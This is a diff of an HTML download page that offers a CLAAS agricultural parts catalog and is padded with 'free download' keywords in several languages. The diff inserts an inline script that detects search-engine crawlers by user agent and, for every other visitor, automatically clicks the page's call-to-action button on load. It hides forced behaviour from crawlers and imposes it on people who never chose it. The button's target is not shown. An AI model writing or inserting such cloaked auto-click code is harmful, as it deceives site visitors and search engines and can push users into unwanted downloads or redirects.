@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CLAAS Parts Doc 2.2 EPC 07.2024 (Agricultural)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download CLAAS Parts Doc 2.2 EPC 07.2024, a comprehensive spare parts catalog for CLAAS agricultural machinery, available in multiple languages.">
     <meta name="keywords" content="CLAAS Parts Doc 2.2, CLAAS Parts Doc EPC, CLAAS Parts Doc 2.2 EPC 07.2024, CLAAS Parts Doc Agricultural, CLAAS Parts Doc download, CLAAS Parts Doc EPC free download, CLAAS Parts Doc EPC 07.2024 free download, CLAAS Parts Doc EPC 2.2 download, CLAAS Parts Doc EPC 2.2 free download, CLAAS spare parts catalog download, CLAAS spare parts catalog free download, CLAAS Parts Doc 2024, CLAAS Parts Doc 2024 download, CLAAS Parts Doc 2024 free download, CLAAS agricultural machinery parts, каталог запчастей CLAAS скачать бесплатно, каталог запчастей CLAAS Parts Doc 2.2, каталог запчастей CLAAS 2024, Каталог запчастей CLAAS скачать бесплатно, каталог запчастей CLAAS EPC, CLAAS запчасти каталог скачать, CLAAS запчасти каталог 2024, CLAAS детали 2024 скачать, CLAAS Parts Doc скачать, CLAAS Parts Doc 2024 скачать, CLAAS Parts Doc украинский каталог, каталог запчастей CLAAS Україна, каталог запчастей CLAAS запчастини, каталог запчастей CLAAS 2.2 завантажити, CLAAS Parts Doc український каталог">
     <style>
